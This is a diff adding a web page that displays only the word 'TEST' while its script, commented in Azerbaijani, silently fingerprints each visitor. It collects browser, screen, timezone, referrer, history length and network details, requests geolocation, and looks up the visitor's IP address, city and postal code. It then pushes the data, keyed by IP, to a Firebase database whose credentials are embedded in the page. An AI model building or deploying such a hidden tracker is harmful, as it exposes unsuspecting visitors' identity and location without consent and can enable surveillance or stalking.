@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Extended User Info with Cache</title>
+</head>
+
+<body>
+    TEST
+
+    <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-database-compat.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAUXBPUJKm3UIXBy13RPqlUGe0wdbf7yHI",
+            authDomain: "user-info-thefeerid.firebaseapp.com",
+            databaseURL: "https://user-info-thefeerid-default-rtdb.firebaseio.com",
+            projectId: "user-info-thefeerid",
+            storageBucket: "user-info-thefeerid.firebasestorage.app",
+            messagingSenderId: "691157814373",
+            appId: "1:691157814373:web:60524a462fc02bbc9a4a8c",
+            measurementId: "G-7DG0LTNSDL"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const CACHE_KEY = "cachedUserInfo";
+        const CACHE_TIMEOUT = 5 * 60 * 1000; // 5 dəqiqəlik timeout
+
+        function saveToCache(data) {
+            const cachedData = {
+                timestamp: Date.now(),
+                data
+            };
+            localStorage.setItem(CACHE_KEY, JSON.stringify(cachedData));
+        }
+
+        function getFromCache() {
+            const cachedData = localStorage.getItem(CACHE_KEY);
+            if (cachedData) {
+                const { timestamp, data } = JSON.parse(cachedData);
+                if (Date.now() - timestamp < CACHE_TIMEOUT) {
+                    return data;
+                }
+            }
+            return null;
+        }
+
+        async function getUserInfo() {
+            let cachedData = getFromCache();
+            if (cachedData) {
+                console.log("Cache-dən istifadə olunur:", cachedData);
+                return cachedData;
+            }
+
+            const userInfo = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
+                cores: navigator.hardwareConcurrency || "Unknown",
+                referrer: document.referrer || "None",
+                historyLength: window.history.length
+            };
+
+            if (navigator.connection) {
+                userInfo.network = {
+                    type: navigator.connection.effectiveType || "Unknown",
+                    downlink: navigator.connection.downlink || "Unknown"
+                };
+            }
+
+            if ('ontouchstart' in window) {
+                userInfo.touchSupport = true;
+            } else {
+                userInfo.touchSupport = false;
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    userInfo.location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                }, () => {
+                    userInfo.location = { error: "Mövqeyi əldə etmək icazəsi yoxdur." };
+                });
+            }
+
+            try {
+                const ipResponse = await fetch("https://ipapi.co/json/");
+                const ipData = await ipResponse.json();
+                let ip = ipData.ip.replace(/\./g, "_");
+
+                userInfo.city = ipData.city || "Unknown";
+                userInfo.region = ipData.region || "Unknown";
+                userInfo.country = ipData.country_name || "Unknown";
+                userInfo.postal = ipData.postal || "Unknown";
+
+                saveToCache(userInfo); // Məlumatı cache-də saxlayırıq
+
+                const ipRef = db.ref(`users/${ip}`);
+                const newEntry = await ipRef.push(userInfo);
+                console.log("Məlumat Firebase-ə yazıldı:", newEntry.key);
+
+                return userInfo;
+            } catch (error) {
+                console.error("Xəta:", error);
+                return null;
+            }
+        }
+
+        getUserInfo();
+    </script>
+</body>
+
+</html>
